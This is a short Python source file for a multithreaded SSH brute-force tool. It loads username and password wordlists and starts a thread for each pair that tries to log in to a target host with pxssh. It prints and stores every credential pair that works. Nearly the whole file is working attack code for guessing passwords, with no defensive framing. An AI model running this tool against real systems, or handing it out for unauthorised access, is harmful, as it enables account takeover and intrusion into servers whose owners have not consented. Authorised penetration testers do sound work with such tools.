import threading, subprocess
from pexpect import pxssh
from colorama import Fore



class SSH():
	def __init__(self, Data):
		self.data = Data


	def load_wordlist_usernames(self):
		try:
			with open(self.data.wordlist_usernames_path, 'r+') as f:
				self.data.wordlist_usernames =  [i.replace('\n', '') for i in f]
		except FileNotFoundError:
			raise FileNotFoundError(f'Wordlist not found. Inputed path: {self.data.wordlist_usernames_path}')
		except FileExistsError:
			raise FileExistsError(f'Wordlist not found. Inputed path: {self.data.wordlist_usernames_path}')


	def load_wordlist_passwords(self):
		try:
			with open(self.data.wordlist_passwords_path, 'r+') as f:
				self.data.wordlist_passwords =  [i.replace('\n', '') for i in f]
		except FileNotFoundError:
			raise FileNotFoundError(f'Wordlist not found. Inputed path: {self.data.wordlist_usernames_path}')
		except FileExistsError:
			raise FileExistsError(f'Wordlist not found. Inputed path: {self.data.wordlist_usernames_path}')



class Brute(threading.Thread):
	def __init__(self, Data, username, password):
		threading.Thread.__init__(self)
		self.data = Data
		self.username = username
		self.password = password


	def run(self):
		try:
			s = pxssh.pxssh()
			s.login(self.data.target, self.username, self.password)
			print(f'{Fore.GREEN}Password Found! {self.username} {self.password}')
			self.data.goods.append((self.username, self.password))
			
		except pxssh.ExceptionPxssh:
			pass

		except Exception as e:
			print("Error!", e)
